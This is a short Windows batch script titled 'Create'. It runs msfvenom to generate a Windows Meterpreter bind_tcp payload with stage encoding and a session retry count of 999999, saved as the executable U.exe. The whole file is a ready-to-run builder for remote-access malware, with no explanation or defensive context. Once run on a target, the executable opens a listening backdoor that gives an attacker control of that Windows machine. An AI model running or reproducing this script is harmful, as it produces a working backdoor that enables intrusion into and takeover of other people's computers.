@echo off
title Create
msfvenom -p windows/meterpreter/bind_tcp EnableStageEncoding=true SessionRetryTotal=999999 -f exe -o U.exe